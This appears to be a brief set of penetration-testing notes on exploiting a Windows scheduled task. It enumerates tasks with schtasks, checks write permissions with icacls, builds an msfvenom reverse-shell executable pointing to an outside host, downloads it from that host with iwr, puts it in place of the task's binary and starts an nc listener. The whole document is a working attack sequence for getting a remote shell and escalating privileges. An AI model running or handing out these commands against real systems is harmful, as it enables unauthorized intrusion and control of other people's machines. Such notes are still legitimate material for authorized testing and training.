# Find tasks
```bash
schtasks /query /fo LIST /v
```
-----------------------

# Vulnerable task exploiting

```bash
# Check permissions we need F or M
icacls C:\Users\steve\Pictures\example.exe

# Create payload
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.188 LPORT=443 -f exe -o example.exe

# Transfer payload
iwr -uri http://192.168.45.188/example.exe -Outfile example.exe

# Put shell on correct path
move .\example.exe C:\Users\steve\Pictures\example.exe

# Start listener
rlwrap nc -lvnp 443
```
